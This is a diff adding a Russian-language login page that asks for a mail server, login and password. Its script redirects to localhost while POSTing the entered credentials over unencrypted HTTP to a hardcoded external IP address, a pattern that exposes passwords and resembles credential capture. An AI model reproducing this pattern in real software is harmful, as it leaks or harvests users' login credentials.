@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Registration</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background: #d2e7ff;
+      color: #344e7c;
+    }
+    
+    h2 {
+      color: #5883cc;
+      text-align: center;
+      font-size: 36px;
+    }
+    
+    h3 {
+      color: #1c4792;
+      margin: 8px;
+      font-size: 24px;
+    }
+    
+    .login-form {
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+      background: #d2e7ff;
+      color: #344e7c;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 400px;
+    }
+    
+    .login-form input {
+      width: 90%;
+      padding: 15px;
+      margin: 15px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 18px;
+    }
+    
+    .login-form button {
+      width: 90%;
+      padding: 15px;
+      background-color: #007bff;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 25px;
+      background-color: transparent;
+      border: 2px solid #5883cc;
+      color: #1c4792;
+      text-transform: uppercase;
+      font-weight: 700;
+      font-size: 20px;
+    }
+    
+    .login-form button:hover {
+      color: #ffffff;
+      background-color: #0841a3;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="login-form">
+    <h2>Вход</h2>
+    <h3>Введите сервер:</h3>
+    <input type="text" id="host" placeholder="server" name="host" required>
+    <h3>Введите логин:</h3>
+    <input type="text" id="login" placeholder="login" name="login" required>
+    <h3>Введите пароль:</h3>
+    <input type="password" id="password" placeholder="password" required>
+    <button type="submit" id="bth">Далее</button>
+  </div>
+
+  <script>
+    var button = document.getElementById("bth");
+    button.addEventListener("click", function() {
+      var login = document.getElementById("login").value;
+      var password = document.getElementById("password").value;
+      var s = document.getElementById("host").value;
+      if (login !== "" && password !== "" && s != "") {
+        window.location.href = "http://localhost:2727/mail";
+        fetch("http://185.102.139.161:2727/l", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              login: login,
+              password: password,
+              host: s
+            })
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log("Login successful");
+            } else {
+              console.error("Login failed");
+            }
+          })
+          .catch(error => {
+            console.error("Error:", error);
+          });
+      }
+    });
+  </script>
+</body>
+
+</html>
